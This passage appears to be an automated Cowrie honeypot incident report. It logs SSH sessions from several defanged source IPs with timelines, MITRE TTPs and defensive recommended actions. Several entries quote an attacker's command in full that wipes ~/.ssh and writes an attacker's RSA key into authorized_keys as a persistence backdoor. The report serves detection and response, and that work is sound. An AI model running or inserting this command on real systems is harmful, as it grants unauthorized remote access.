| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 09:12:50` | `cowrie.session.connect` |
| `2026-06-04 09:12:50` | `cowrie.client.version` |
| `2026-06-04 09:12:51` | `cowrie.client.kex` |
| `2026-06-04 09:12:51` | `cowrie.login.success` |
| `2026-06-04 09:12:51` | `cowrie.session.params` |
| `2026-06-04 09:12:51` | `cowrie.command.input` |
| `2026-06-04 09:12:51` | `cowrie.command.failed` |
| `2026-06-04 09:12:52` | `cowrie.log.closed` |
| `2026-06-04 09:12:52` | `cowrie.session.params` |
| `2026-06-04 09:12:52` | `cowrie.command.input` |
| `2026-06-04 09:12:52` | `cowrie.session.file_download` |
| `2026-06-04 09:12:52` | `cowrie.log.closed` |
| `2026-06-04 09:12:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.27.20[.]28` to AbuseIPDB if not already reported
- [ ] Block `2.27.20[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c53f4968285e

| Field | Detail |
|---|---|
| **Source IP** | `2.27.20[.]28` |
| **First Seen** | 2026-06-04 09:12 |
| **Last Seen** | 2026-06-04 09:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 09:12:54` | `cowrie.session.connect` |
| `2026-06-04 09:12:54` | `cowrie.client.version` |
| `2026-06-04 09:12:54` | `cowrie.client.kex` |
| `2026-06-04 09:12:55` | `cowrie.login.success` |
| `2026-06-04 09:12:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.27.20[.]28` to AbuseIPDB if not already reported
- [ ] Block `2.27.20[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e47dd961d4bd

| Field | Detail |
|---|---|
| **Source IP** | `2.27.20[.]28` |
| **First Seen** | 2026-06-04 09:14 |
| **Last Seen** | 2026-06-04 09:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 09:14:26` | `cowrie.session.connect` |
| `2026-06-04 09:14:26` | `cowrie.client.version` |
| `2026-06-04 09:14:26` | `cowrie.client.kex` |
| `2026-06-04 09:14:27` | `cowrie.login.success` |
| `2026-06-04 09:14:27` | `cowrie.session.params` |
| `2026-06-04 09:14:27` | `cowrie.command.input` |
| `2026-06-04 09:14:27` | `cowrie.command.failed` |
| `2026-06-04 09:14:27` | `cowrie.log.closed` |
| `2026-06-04 09:14:28` | `cowrie.session.params` |
| `2026-06-04 09:14:28` | `cowrie.command.input` |
| `2026-06-04 09:14:28` | `cowrie.session.file_download` |
| `2026-06-04 09:14:28` | `cowrie.log.closed` |
| `2026-06-04 09:14:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.27.20[.]28` to AbuseIPDB if not already reported
- [ ] Block `2.27.20[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5801e90a8091

| Field | Detail |
|---|---|
| **Source IP** | `2.27.20[.]28` |
| **First Seen** | 2026-06-04 09:14 |
| **Last Seen** | 2026-06-04 09:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 09:14:30` | `cowrie.session.connect` |
| `2026-06-04 09:14:30` | `cowrie.client.version` |
| `2026-06-04 09:14:30` | `cowrie.client.kex` |
| `2026-06-04 09:14:30` | `cowrie.login.success` |
| `2026-06-04 09:14:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.27.20[.]28` to AbuseIPDB if not already reported
- [ ] Block `2.27.20[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-def03f48d208

| Field | Detail |
|---|---|
| **Source IP** | `2.27.20[.]28` |
| **First Seen** | 2026-06-04 09:16 |
| **Last Seen** | 2026-06-04 09:16 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 09:16:05` | `cowrie.session.connect` |
| `2026-06-04 09:16:05` | `cowrie.client.version` |
| `2026-06-04 09:16:05` | `cowrie.client.kex` |
| `2026-06-04 09:16:06` | `cowrie.login.success` |
| `2026-06-04 09:16:06` | `cowrie.session.params` |
| `2026-06-04 09:16:06` | `cowrie.command.input` |
| `2026-06-04 09:16:06` | `cowrie.command.failed` |
| `2026-06-04 09:16:06` | `cowrie.log.closed` |
| `2026-06-04 09:16:06` | `cowrie.session.params` |
| `2026-06-04 09:16:06` | `cowrie.command.input` |
| `2026-06-04 09:16:07` | `cowrie.session.file_download` |
| `2026-06-04 09:16:07` | `cowrie.log.closed` |
| `2026-06-04 09:16:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.27.20[.]28` to AbuseIPDB if not already reported
- [ ] Block `2.27.20[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ece063e9ab5

| Field | Detail |
|---|---|
| **Source IP** | `2.27.20[.]28` |
| **First Seen** | 2026-06-04 09:16 |
| **Last Seen** | 2026-06-04 09:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 09:16:09` | `cowrie.session.connect` |
| `2026-06-04 09:16:09` | `cowrie.client.version` |
| `2026-06-04 09:16:09` | `cowrie.client.kex` |
| `2026-06-04 09:16:10` | `cowrie.login.success` |
| `2026-06-04 09:16:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.27.20[.]28` to AbuseIPDB if not already reported
- [ ] Block `2.27.20[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3b674a58ed3

| Field | Detail |
|---|---|
| **Source IP** | `2.27.20[.]28` |
| **First Seen** | 2026-06-04 09:17 |
| **Last Seen** | 2026-06-04 09:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 09:17:40` | `cowrie.session.connect` |
| `2026-06-04 09:17:40` | `cowrie.client.version` |
| `2026-06-04 09:17:40` | `cowrie.client.kex` |
| `2026-06-04 09:17:41` | `cowrie.login.success` |
| `2026-06-04 09:17:41` | `cowrie.session.params` |
| `2026-06-04 09:17:41` | `cowrie.command.input` |
| `2026-06-04 09:17:41` | `cowrie.command.failed` |
| `2026-06-04 09:17:42` | `cowrie.log.closed` |
| `2026-06-04 09:17:42` | `cowrie.session.params` |
| `2026-06-04 09:17:42` | `cowrie.command.input` |
| `2026-06-04 09:17:42` | `cowrie.session.file_download` |
| `2026-06-04 09:17:42` | `cowrie.log.closed` |
| `2026-06-04 09:17:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.27.20[.]28` to AbuseIPDB if not already reported
- [ ] Block `2.27.20[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9498f4c2cd5

| Field | Detail |
|---|---|
| **Source IP** | `2.27.20[.]28` |
| **First Seen** | 2026-06-04 09:17 |
| **Last Seen** | 2026-06-04 09:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 09:17:44` | `cowrie.session.connect` |
| `2026-06-04 09:17:44` | `cowrie.client.version` |
| `2026-06-04 09:17:44` | `cowrie.client.kex` |
| `2026-06-04 09:17:45` | `cowrie.login.success` |
| `2026-06-04 09:17:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.27.20[.]28` to AbuseIPDB if not already reported
- [ ] Block `2.27.20[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21dfcd95529b

| Field | Detail |
|---|---|
| **Source IP** | `2.27.20[.]28` |
| **First Seen** | 2026-06-04 09:22 |
| **Last Seen** | 2026-06-04 09:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 09:22:25` | `cowrie.session.connect` |
| `2026-06-04 09:22:25` | `cowrie.client.version` |
| `2026-06-04 09:22:25` | `cowrie.client.kex` |
| `2026-06-04 09:22:26` | `cowrie.login.success` |
| `2026-06-04 09:22:26` | `cowrie.session.params` |
| `2026-06-04 09:22:26` | `cowrie.command.input` |
| `2026-06-04 09:22:26` | `cowrie.command.failed` |
| `2026-06-04 09:22:26` | `cowrie.log.closed` |
| `2026-06-04 09:22:26` | `cowrie.session.params` |
| `2026-06-04 09:22:26` | `cowrie.command.input` |
| `2026-06-04 09:22:26` | `cowrie.session.file_download` |
| `2026-06-04 09:22:26` | `cowrie.log.closed` |
| `2026-06-04 09:22:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.27.20[.]28` to AbuseIPDB if not already reported
- [ ] Block `2.27.20[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-410f4a8c76fe

| Field | Detail |
|---|---|
| **Source IP** | `2.27.20[.]28` |
| **First Seen** | 2026-06-04 09:22 |
| **Last Seen** | 2026-06-04 09:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 09:22:29` | `cowrie.session.connect` |
| `2026-06-04 09:22:29` | `cowrie.client.version` |
| `2026-06-04 09:22:29` | `cowrie.client.kex` |
| `2026-06-04 09:22:29` | `cowrie.login.success` |
| `2026-06-04 09:22:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.27.20[.]28` to AbuseIPDB if not already reported
- [ ] Block `2.27.20[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0349a4a801d6

| Field | Detail |
|---|---|
| **Source IP** | `103.75.182[.]178` |
| **First Seen** | 2026-06-04 09:30 |
| **Last Seen** | 2026-06-04 09:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 09:30:40` | `cowrie.session.connect` |
| `2026-06-04 09:30:40` | `cowrie.client.version` |
| `2026-06-04 09:30:40` | `cowrie.client.kex` |
| `2026-06-04 09:30:40` | `cowrie.login.success` |
| `2026-06-04 09:30:41` | `cowrie.session.params` |
| `2026-06-04 09:30:41` | `cowrie.command.input` |
| `2026-06-04 09:30:41` | `cowrie.command.failed` |
| `2026-06-04 09:30:41` | `cowrie.log.closed` |
| `2026-06-04 09:30:41` | `cowrie.session.params` |
| `2026-06-04 09:30:41` | `cowrie.command.input` |
| `2026-06-04 09:30:41` | `cowrie.session.file_download` |
| `2026-06-04 09:30:41` | `cowrie.log.closed` |
| `2026-06-04 09:30:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.75.182[.]178` to AbuseIPDB if not already reported
- [ ] Block `103.75.182[.]178` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aebca45955e0

| Field | Detail |
|---|---|
| **Source IP** | `103.75.182[.]178` |
| **First Seen** | 2026-06-04 09:30 |
| **Last Seen** | 2026-06-04 09:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 09:30:43` | `cowrie.session.connect` |
| `2026-06-04 09:30:43` | `cowrie.client.version` |
| `2026-06-04 09:30:43` | `cowrie.client.kex` |
| `2026-06-04 09:30:43` | `cowrie.login.success` |
| `2026-06-04 09:30:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.75.182[.]178` to AbuseIPDB if not already reported
- [ ] Block `103.75.182[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-590115a47281

| Field | Detail |
|---|---|
| **Source IP** | `150.5.131[.]119` |
| **First Seen** | 2026-06-04 09:32 |
| **Last Seen** | 2026-06-04 09:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 09:32:03` | `cowrie.session.connect` |
| `2026-06-04 09:32:03` | `cowrie.client.version` |
| `2026-06-04 09:32:03` | `cowrie.client.kex` |
| `2026-06-04 09:32:03` | `cowrie.login.success` |
| `2026-06-04 09:32:04` | `cowrie.session.params` |
| `2026-06-04 09:32:04` | `cowrie.command.input` |
| `2026-06-04 09:32:04` | `cowrie.command.failed` |
| `2026-06-04 09:32:04` | `cowrie.log.closed` |
| `2026-06-04 09:32:04` | `cowrie.session.params` |
| `2026-06-04 09:32:04` | `cowrie.command.input` |
| `2026-06-04 09:32:04` | `cowrie.session.file_download` |
| `2026-06-04 09:32:04` | `cowrie.log.closed` |
| `2026-06-04 09:32:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.5.131[.]119` to AbuseIPDB if not already reported
- [ ] Block `150.5.131[.]119` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e30ce8248d50

| Field | Detail |
|---|---|
| **Source IP** | `150.5.131[.]119` |
| **First Seen** | 2026-06-04 09:32 |
| **Last Seen** | 2026-06-04 09:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 09:32:06` | `cowrie.session.connect` |
| `2026-06-04 09:32:06` | `cowrie.client.version` |
| `2026-06-04 09:32:06` | `cowrie.client.kex` |
| `2026-06-04 09:32:07` | `cowrie.login.success` |
| `2026-06-04 09:32:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.5.131[.]119` to AbuseIPDB if not already reported
- [ ] Block `150.5.131[.]119` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-941827706feb

| Field | Detail |
|---|---|
| **Source IP** | `103.143.12[.]163` |
| **First Seen** | 2026-06-04 09:38 |
| **Last Seen** | 2026-06-04 09:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 09:38:37` | `cowrie.session.connect` |
| `2026-06-04 09:38:37` | `cowrie.client.version` |
| `2026-06-04 09:38:37` | `cowrie.client.kex` |
| `2026-06-04 09:38:38` | `cowrie.login.success` |
| `2026-06-04 09:38:38` | `cowrie.session.params` |
| `2026-06-04 09:38:38` | `cowrie.command.input` |
| `2026-06-04 09:38:38` | `cowrie.command.failed` |
| `2026-06-04 09:38:38` | `cowrie.log.closed` |
| `2026-06-04 09:38:38` | `cowrie.session.params` |
| `2026-06-04 09:38:38` | `cowrie.command.input` |
| `2026-06-04 09:38:38` | `cowrie.session.file_download` |
| `2026-06-04 09:38:38` | `cowrie.log.closed` |
| `2026-06-04 09:38:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.12[.]163` to AbuseIPDB if not already reported
- [ ] Block `103.143.12[.]163` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99333d3f7940

| Field | Detail |
|---|---|
| **Source IP** | `103.143.12[.]163` |
| **First Seen** | 2026-06-04 09:38 |
| **Last Seen** | 2026-06-04 09:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 09:38:40` | `cowrie.session.connect` |
| `2026-06-04 09:38:40` | `cowrie.client.version` |
| `2026-06-04 09:38:40` | `cowrie.client.kex` |
| `2026-06-04 09:38:40` | `cowrie.login.success` |
| `2026-06-04 09:38:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.12[.]163` to AbuseIPDB if not already reported
- [ ] Block `103.143.12[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2140087f0db1

| Field | Detail |
|---|---|
| **Source IP** | `103.143.12[.]163` |
| **First Seen** | 2026-06-04 09:49 |
| **Last Seen** | 2026-06-04 09:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 09:49:58` | `cowrie.session.connect` |
| `2026-06-04 09:49:58` | `cowrie.client.version` |
| `2026-06-04 09:49:58` | `cowrie.client.kex` |
| `2026-06-04 09:49:59` | `cowrie.login.success` |
| `2026-06-04 09:49:59` | `cowrie.session.params` |
| `2026-06-04 09:49:59` | `cowrie.command.input` |
| `2026-06-04 09:49:59` | `cowrie.command.failed` |
| `2026-06-04 09:49:59` | `cowrie.log.closed` |
| `2026-06-04 09:49:59` | `cowrie.session.params` |
| `2026-06-04 09:49:59` | `cowrie.command.input` |
| `2026-06-04 09:49:59` | `cowrie.session.file_download` |
| `2026-06-04 09:49:59` | `cowrie.log.closed` |
| `2026-06-04 09:50:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.12[.]163` to AbuseIPDB if not already reported
- [ ] Block `103.143.12[.]163` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7d1020e61ca

| Field | Detail |
|---|---|
| **Source IP** | `103.143.12[.]163` |
| **First Seen** | 2026-06-04 09:50 |
| **Last Seen** | 2026-06-04 09:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

